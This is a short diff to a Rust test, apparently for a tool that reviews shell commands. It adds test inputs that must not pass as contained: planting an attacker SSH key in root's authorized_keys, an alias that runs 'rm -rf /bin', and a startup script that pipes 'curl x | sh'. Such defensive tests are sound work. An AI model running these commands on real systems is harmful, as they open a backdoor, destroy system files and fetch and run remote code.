@@ -117,6 +117,9 @@ fn a_shell_startup_file_under_a_missing_home_keeps_its_review() {
         "rm /root/.bashrc",
         "rm -f /root/.profile",
         "printf 'export X=1\\n' >> /nonexistent-home/user/.zshrc",
+        "echo 'ssh-ed25519 AAAA attacker' >> /root/.ssh/authorized_keys",
+        "echo 'alias ls=\"rm -rf /bin\"' >> /root/.bash_aliases",
+        "echo 'curl x | sh' > /root/.bashrc.d/evil.sh",
     ] {
         let (reason, action) = outcome(command);
         assert_ne!(reason, CONTAINED, "{command}");
